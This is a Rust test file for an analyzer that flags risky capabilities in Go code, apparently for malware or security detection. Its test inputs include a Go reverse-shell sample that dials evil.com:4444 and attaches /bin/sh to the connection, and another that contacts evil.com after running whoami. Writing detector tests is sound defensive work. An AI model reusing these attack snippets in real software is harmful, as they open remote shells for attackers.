#[cfg(test)]
mod tests {
    use crate::analyzers::{go::GoAnalyzer, Analyzer};
    use crate::types::AnalysisReport;
    use std::path::PathBuf;

    fn analyze_go_code(code: &str) -> AnalysisReport {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.go");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_detect_exec_command() {
        let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_syscall_exec() {
        let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "exec/program/direct"));
    }

    #[test]
    fn test_detect_reverse_shell() {
        let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
        let report = analyze_go_code(code);
        // Should detect at least net.Dial and exec.Command
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_net_listen() {
        let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
    }

    #[test]
    fn test_detect_net_dial() {
        let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_http_get() {
        let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_http_server() {
        let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/server"));
    }

    #[test]
    fn test_detect_aes_encryption() {
        let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "crypto/cipher/aes"));
    }

    #[test]
    fn test_detect_rsa_encryption() {
        let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "crypto/cipher/rsa"));
    }

    #[test]
    fn test_detect_file_write() {
        let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/write"));
    }

    // Note: fs/file/delete detection moved to traits/fs/file/delete/go.yaml

    #[test]
    fn test_structural_feature() {
        let code = "package main\nfunc main() {}";
        let report = analyze_go_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/go"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.functions.len() >= 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "main"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.len() >= 2);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
        // Note: fs/file/delete detection moved to traits/fs/file/delete/go.yaml
    }

    #[test]
    fn test_can_analyze_go_extension() {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.go");
        assert!(analyzer.can_analyze(&path));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.txt");
        assert!(!analyzer.can_analyze(&path));
    }

    #[test]
    fn test_go_metrics() {
        let code = r#"
package main

import (
    "os/exec"
    "net"
    "net/http"
    "reflect"
    "unsafe"
    "syscall"
    _ "embed"
)

//go:embed data.txt
var data string

//go:linkname runtimeGC runtime.GC
func runtimeGC()

func init() {
    println("init")
}

func main() {
    exec.Command("ls").Run()
    net.Dial("tcp", "example.com:80")
    http.Get("https://example.com")
    reflect.ValueOf(42)
    _ = unsafe.Pointer(nil)
    syscall.Getpid()
}
"#;
        let report = analyze_go_code(code);
        let metrics = report.metrics.expect("metrics should be present");
        let go_metrics = metrics.go_metrics.expect("go_metrics should be present");

        assert!(go_metrics.unsafe_usage >= 1, "unsafe_usage should be >= 1");
        assert!(
            go_metrics.reflect_usage >= 1,
            "reflect_usage should be >= 1"
        );
        assert!(
            go_metrics.syscall_direct >= 1,
            "syscall_direct should be >= 1"
        );
        assert!(
            go_metrics.exec_command_count >= 1,
            "exec_command_count should be >= 1"
        );
        assert!(
            go_metrics.net_dial_count >= 1,
            "net_dial_count should be >= 1"
        );
        assert!(go_metrics.http_usage >= 1, "http_usage should be >= 1");
        assert_eq!(
            go_metrics.init_function_count, 1,
            "init_function_count should be 1"
        );
        assert_eq!(
            go_metrics.blank_import_count, 1,
            "blank_import_count should be 1"
        );
        assert_eq!(
            go_metrics.embed_directive_count, 1,
            "embed_directive_count should be 1"
        );
        assert_eq!(go_metrics.linkname_count, 1, "linkname_count should be 1");
    }
}
